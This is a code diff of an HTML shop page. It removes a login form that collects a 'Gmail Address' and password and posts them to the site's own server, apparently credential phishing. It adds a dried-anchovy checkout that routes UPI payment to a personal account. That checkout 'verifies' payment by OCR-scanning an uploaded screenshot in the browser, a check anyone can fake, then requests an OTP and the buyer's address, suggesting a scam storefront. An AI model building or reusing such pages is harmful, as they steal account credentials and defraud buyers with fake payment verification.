@@ -1,27 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <title>Coastal Store | Secure Order</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>body { background: #050507; color: white; }</style>
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
+    <style>
+        body { background: #0a0a0c; color: white; font-family: sans-serif; }
+        .glass { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
+        .step { display: none; } .active { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .scan-anim { width: 100%; height: 2px; background: #22c55e; position: absolute; animation: move 2s infinite; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+    </style>
 </head>
-<body class="flex items-center justify-center h-screen">
-    <div class="bg-white/5 border border-white/10 p-10 rounded-[2.5rem] w-full max-w-md text-center">
-        <h1 class="text-3xl font-black mb-8 italic">COASTAL<span class="text-blue-500">DRIED</span></h1>
-        <input type="email" id="email" placeholder="Gmail Address" class="w-full p-4 mb-4 bg-black rounded-xl outline-none border border-white/5">
-        <input type="password" id="pass" placeholder="Password" class="w-full p-4 mb-8 bg-black rounded-xl outline-none border border-white/5">
-        <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-xl font-bold tracking-widest">ENTER STORE</button>
+<body class="p-5">
+    <div class="max-w-md mx-auto">
+        <div id="step-0" class="step active">
+            <h1 class="text-2xl font-black mb-6 italic uppercase">Coastal <span class="text-green-500">Store</span></h1>
+            <div class="glass p-6 rounded-3xl">
+                <img src="https://images.unsplash.com/photo-1615141982883-c7ad0e69fd62?w=500" class="w-full h-40 object-cover rounded-2xl mb-4">
+                <h3 class="font-bold text-lg">Dried Anchovies (Premium)</h3>
+                <div class="mt-4 flex items-center justify-between">
+                    <span>Quantity:</span>
+                    <input type="number" id="qty" value="1" min="1" oninput="calc()" class="w-16 bg-white/10 rounded-lg p-2 text-center text-green-500 font-bold">
+                </div>
+                <div class="mt-6 flex justify-between items-baseline">
+                    <span class="text-xs text-gray-500">TOTAL:</span>
+                    <span id="price-tag" class="text-3xl font-black text-green-500">₹299</span>
+                </div>
+                <button onclick="next(1)" class="w-full bg-green-600 py-4 mt-6 rounded-xl font-bold">BUY NOW</button>
+            </div>
+        </div>
+
+        <div id="step-1" class="step">
+            <h2 class="text-center font-bold mb-6">SECURE PAYMENT</h2>
+            <div class="bg-white p-4 rounded-3xl mb-6">
+                <img src="/static/payment_qr.jpg" class="w-full rounded-xl">
+            </div>
+            <textarea id="addr" placeholder="Enter Full Address..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-4 h-24 outline-none"></textarea>
+            <button onclick="pay()" class="w-full bg-blue-600 py-4 rounded-xl font-bold mb-3">PAY WITH GOOGLE PAY</button>
+            <button onclick="next(2)" class="w-full border border-white/20 py-4 rounded-xl text-sm">I HAVE PAID (AUDIT)</button>
+        </div>
+
+        <div id="step-2" class="step">
+            <h2 class="text-center font-bold mb-10">PIXEL AUDIT</h2>
+            <div class="glass p-10 rounded-3xl text-center border-dashed border-2 border-green-500/30 relative overflow-hidden" onclick="document.getElementById('scr').click()">
+                <div id="scanner" class="hidden scan-anim"></div>
+                <input type="file" id="scr" class="hidden" onchange="audit()">
+                <p class="text-green-500 text-xs font-bold">CLICK TO UPLOAD SCREENSHOT</p>
+            </div>
+            <button id="audit-btn" disabled class="w-full bg-white/5 py-4 mt-10 rounded-xl opacity-20 cursor-not-allowed">LOCKED</button>
+        </div>
+
+        <div id="step-3" class="step">
+            <h2 class="text-center font-bold mb-10">VERIFY OTP</h2>
+            <input type="text" id="otp" placeholder="000000" class="w-full bg-transparent border-b-2 border-green-500 text-center text-5xl font-bold py-4 outline-none mb-10">
+            <button onclick="submitOrder()" class="w-full bg-green-600 py-4 rounded-xl font-bold">COMPLETE ORDER</button>
+        </div>
+
+        <div id="step-4" class="step text-center">
+            <div class="text-5xl mb-4">📦</div>
+            <h2 class="text-xl font-bold">ORDER TRACKED</h2>
+            <p id="order-id" class="text-xs text-gray-500 font-mono mt-2 mb-8"></p>
+            <div class="glass p-6 rounded-2xl text-left space-y-4">
+                <div class="flex items-center gap-3"><div class="w-2 h-2 bg-green-500 rounded-full"></div><span class="text-sm">Payment Verified</span></div>
+                <div class="flex items-center gap-3 opacity-40"><div class="w-2 h-2 bg-gray-500 rounded-full"></div><span class="text-sm">In Transit</span></div>
+            </div>
+        </div>
     </div>
+
     <script>
-        function login() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
-            fetch('/api/login/', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({email, password})
-            })
-            .then(res => res.json())
-            .then(data => window.location.href = `/store/${data.url_id}/`);
+        let total = 299;
+        function calc() {
+            total = document.getElementById('qty').value * 299;
+            document.getElementById('price-tag').innerText = "₹" + total;
+        }
+        function next(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step-'+n).classList.add('active');
+            if(n===3) fetch('/api/otp/', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:"{{user.email}}"})});
+        }
+        function pay() {
+            window.location.href = `intent://pay?pa=samddin1987@oksbi&pn=SAMSUDDIN&am=${total}&cu=INR#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+        }
+        async function audit() {
+            document.getElementById('scanner').classList.remove('hidden');
+            const { data: { text } } = await Tesseract.recognize(document.getElementById('scr').files[0], 'eng');
+            if(text.toLowerCase().includes("samddin1987") && (text.toLowerCase().includes("success") || text.toLowerCase().includes("completed"))) {
+                const b = document.getElementById('audit-btn'); b.disabled = false; b.classList.replace('bg-white/5','bg-green-600'); b.classList.remove('opacity-20');
+                b.innerText = "CONTINUE"; b.onclick = () => next(3);
+            } else { alert("Failed! Upload real screenshot for samddin1987@oksbi."); }
+            document.getElementById('scanner').classList.add('hidden');
+        }
+        function submitOrder() {
+            fetch('/api/finalize/', {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    email: "{{user.email}}", otp: document.getElementById('otp').value,
+                    url_id: "{{user.user_id_slug}}", address: document.getElementById('addr').value,
+                    qty: document.getElementById('qty').value, total: total
+                })
+            }).then(r => r.json()).then(d => {
+                if(d.status === "success") { document.getElementById('order-id').innerText = d.order_id; next(4); }
+                else { alert("Wrong OTP"); }
+            });
         }
     </script>
 </body>
